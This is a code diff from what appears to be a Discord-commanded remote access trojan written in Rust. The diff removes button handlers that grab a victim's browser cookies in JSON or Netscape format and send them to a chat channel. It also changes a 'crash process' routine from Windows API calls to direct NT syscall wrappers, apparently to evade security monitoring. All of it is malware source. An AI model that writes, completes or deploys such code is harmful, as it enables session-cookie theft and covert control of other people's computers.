@@ -9,7 +9,7 @@ use crate::commands::Arguments;
 use crate::config::Config;
 use crate::log_debug;
 
-use crate::commands::filesystem::grabcookie::{GrabCookieCommand, GRAB_JSON_BUTTON, GRAB_NETSCAPE_BUTTON};
+use crate::commands::filesystem::grabcookie::GrabCookieCommand;
 
 pub async fn handle_message(
     http: &Arc<HttpClient>,
@@ -27,9 +27,7 @@ pub async fn handle_message(
         } else { parts.collect::<Vec<_>>().join(" ") };
 
         let registry = get_registry();
-        
         if registry.command_exists(command_name) {
-            // Check auth first (this is fast, don't need to spawn)
             if let Err(auth_error) = crate::core::auth::require_auth(http, &msg).await {
                 let response = auth_error.to_string();
                 http.create_message(msg.channel_id)
@@ -52,7 +50,7 @@ pub async fn handle_message(
                     .execute_command(&command_name_owned, &http_clone, &msg_clone, args_obj)
                     .await
                 {
-                    log_debug!("Error executing command {}: {}", command_name_owned, e);
+                    println!("Error executing command {}: {}", command_name_owned, e);
 
                     let response = format!(
                         "ERROR: An error occurred while executing `{}{}`",
@@ -101,53 +99,7 @@ pub async fn handle_interaction(
             .ok_or_else(|| anyhow::anyhow!("No channel in interaction"))?;
 
         match custom_id.as_str() {
-            // from grabcookie.rs
-            // ----------------------------------------
-            GRAB_JSON_BUTTON => {
-                http.interaction(interaction.application_id)
-                    .create_response(
-                        interaction.id,
-                        &interaction.token,
-                        &InteractionResponse {
-                            kind: InteractionResponseType::DeferredUpdateMessage,
-                            data: None,
-                        },
-                    )
-                    .await?;
 
-                if let Some(msg) = &interaction.message {
-                    let _ = http.delete_message(channel_id, msg.id).await;
-                }
-
-                if let Err(e) = GrabCookieCommand::execute_grab(http, channel_id, "json").await {
-                    http.create_message(channel_id)
-                        .content(&format!("Error grabbing cookies: {}", e))
-                        .await?;
-                }
-            }
-
-            GRAB_NETSCAPE_BUTTON => {
-                http.interaction(interaction.application_id)
-                    .create_response(
-                        interaction.id,
-                        &interaction.token,
-                        &InteractionResponse {
-                            kind: InteractionResponseType::DeferredUpdateMessage,
-                            data: None,
-                        },
-                    )
-                    .await?;
-
-                if let Some(msg) = &interaction.message {
-                    let _ = http.delete_message(channel_id, msg.id).await;
-                }
-
-                if let Err(e) = GrabCookieCommand::execute_grab(http, channel_id, "netscape").await {
-                    http.create_message(channel_id)
-                        .content(&format!("Error grabbing cookies: {}", e))
-                        .await?;
-                }
-            }
 
             // from foreground.rs
             // ----------------------------------------
@@ -183,23 +135,18 @@ pub async fn handle_interaction(
 
 //@ Terminate a process by PID
 fn terminate_process(pid: u32) -> String {
-    use winapi::um::handleapi::CloseHandle;
-    use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
-    use winapi::um::winnt::PROCESS_TERMINATE;
+    use crate::utils::syscall::{self, access};
+    
+    if let Some(handle) = syscall::nt_open_process(pid, access::PROCESS_TERMINATE) {
+        let success = syscall::nt_terminate_process(handle, 1);
+        syscall::nt_close(handle);
 
-    unsafe {
-        let handle = OpenProcess(PROCESS_TERMINATE, 0, pid);
-        if !handle.is_null() {
-            let result = TerminateProcess(handle, 1);
-            CloseHandle(handle);
-
-            if result != 0 {
-                format!("Successfully crashed process (PID: {})", pid)
-            } else {
-                format!("Failed to crash process (PID: {})", pid)
-            }
+        if success {
+            format!("Successfully crashed process (PID: {})", pid)
         } else {
-            format!("Failed to open process (PID: {})", pid)
+            format!("Failed to crash process (PID: {})", pid)
         }
+    } else {
+        format!("Failed to open process (PID: {})", pid)
     }
 }
